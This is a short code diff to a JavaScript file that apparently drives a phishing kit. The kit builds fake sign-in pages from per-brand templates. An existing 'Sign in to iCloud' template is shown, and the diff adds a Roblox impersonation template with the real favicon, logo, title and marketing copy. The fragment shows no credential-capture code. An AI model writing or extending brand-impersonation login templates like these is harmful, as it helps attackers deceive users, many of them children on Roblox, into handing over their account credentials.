@@ -41,6 +41,12 @@ document.addEventListener('DOMContentLoaded', () => {
             formTitle: "Sign in to iCloud", formSubtitle: "Use your Apple ID.",
             logoHtml: '<i class="fab fa-apple"></i>',
             adHtml: `<img src="https://upload.wikimedia.org/wikipedia/commons/thumb/f/fa/Apple_logo_black.svg/160px-Apple_logo_black.svg.png" alt="Apple Logo" class="ad-logo apple-ad-logo"><h4>Privacy. That’s iPhone.</h4><p>And iCloud. Your data is yours, protected and secure.</p><a href="#" class="ad-link">Learn about Apple Privacy »</a>`
+        },
+        roblox: {
+            title: "Log In - Roblox", favicon: "https://www.roblox.com/favicon.ico", name: "Roblox",
+            formTitle: "Log in to Roblox", formSubtitle: "Powering Imagination.", // A more impactful subtitle
+            logoHtml: '<i class="fas fa-cube"></i>',
+            adHtml: `<img src="https://images.rbxcdn.com/e854eb7b2951ac03edba9a2681032bba.ico" alt="Roblox Logo" class="ad-logo"><h4>The Creator Economy</h4><p>Build, publish, and operate 3D immersive experiences.</p><a href="#" class="ad-link">Learn More »</a>`
         }
     };
 
